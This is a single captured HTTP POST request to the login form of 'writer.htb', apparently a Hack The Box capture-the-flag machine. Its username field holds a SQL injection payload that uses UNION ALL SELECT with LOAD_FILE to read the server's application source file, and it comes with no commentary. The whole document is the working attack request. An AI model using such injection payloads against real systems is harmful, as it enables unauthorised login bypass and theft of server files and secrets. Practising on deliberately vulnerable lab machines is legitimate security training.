#####################################

POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=mafsdnsfdsdfa' UNION ALL SELECT 0,LOAD_FILE('/var/www/writer.htb/writer/__init__.py'),2,3,4,5; --&password=admin

#####################################
